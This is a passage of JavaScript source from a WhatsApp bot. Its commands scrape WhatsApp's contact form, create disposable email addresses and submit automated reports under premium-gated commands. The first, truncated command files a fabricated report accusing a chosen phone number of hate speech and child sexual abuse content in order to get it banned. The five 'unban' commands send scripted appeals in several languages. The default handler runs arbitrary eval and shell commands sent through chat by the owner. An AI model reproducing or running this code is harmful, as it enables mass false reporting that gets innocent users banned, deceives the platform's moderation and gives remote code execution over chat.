let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
            
            default:
                if (budy.startsWith('=>')) {
                    if (!XeonTheCreator) return XeonStickOwner()
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcxeon(bang)
                    }
                    try {
                        replygcxeon(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcxeon(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!XeonTheCreator) return XeonStickOwner()
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcxeon(evaled)
                    } catch (err) {
                        await replygcxeon(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!XeonTheCreator) return XeonStickOwner()
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcxeon(err)
                        if (stdout) return replygcxeon(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
            }
    } catch (err) {
        console.log(util.format(err))
        let e = String(err)
XeonBotInc.sendMessage("123123@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
if (e.includes("conflict")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
